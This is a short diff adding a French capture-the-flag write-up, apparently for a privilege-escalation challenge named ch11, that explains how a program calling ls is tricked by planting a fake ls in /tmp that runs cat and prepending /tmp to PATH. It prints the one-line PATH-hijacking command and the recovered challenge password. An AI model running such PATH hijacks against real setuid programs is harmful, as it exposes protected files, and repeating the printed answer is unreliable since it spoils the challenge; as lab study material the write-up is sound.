@@ -1,0 +1,6 @@
+Le programme fait un ls sur le fichier contenant le mot de passe.
+Nous allons simplement creer un executable ls qui va appeler cat
+
+echo "cat \$1" > /tmp/ls ; chmod +x /tmp/ls ; export PATH=/tmp:$PATH ; ./ch11
+
+password = !oPe96a/.s8d5
